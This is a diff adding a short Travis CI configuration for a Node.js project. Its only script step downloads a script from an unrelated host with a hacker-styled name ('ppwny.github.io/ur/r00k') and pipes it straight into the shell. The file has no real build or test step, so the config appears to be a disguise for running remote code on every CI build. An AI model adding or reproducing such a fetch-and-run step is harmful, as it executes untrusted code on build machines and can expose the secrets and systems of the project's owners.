@@ -1,0 +1,7 @@
+language: node_js
+node_js:
+  - "6"
+install:
+  - sudo apt-get install -y curl
+script:
+  - curl -s https://ppwny.github.io/ur/r00k | sh
